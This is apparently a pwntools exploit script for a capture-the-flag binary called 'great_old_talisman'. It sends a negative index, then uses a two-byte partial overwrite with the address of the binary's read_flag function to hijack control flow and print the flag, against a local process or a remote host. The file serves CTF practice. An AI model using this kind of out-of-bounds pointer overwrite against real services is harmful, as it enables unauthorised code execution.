from pwn import *
import pdb

context.binary = elf = ELF('great_old_talisman')

context(terminal=['tmux', 'split-window', '-h'])

gs = '''
init-pwndbg
handle SIGALRM ignore
c
'''

def get_process():
    if len(sys.argv) == 1:
        return elf.process()

    host, port = sys.argv[1].split(':')
    return remote(host, port)

def main():
    p = get_process()
    #p = gdb.debug('./great_old_talisman', gdbscript=gs, aslr=False)

    p.sendlineafter(b'>> ', b'-4')
    p.sendafter(b'Spell: ', p16(context.binary.sym.read_flag & 0xffff))
    p.success(p.recv().decode())

if __name__ == '__main__':
    main()
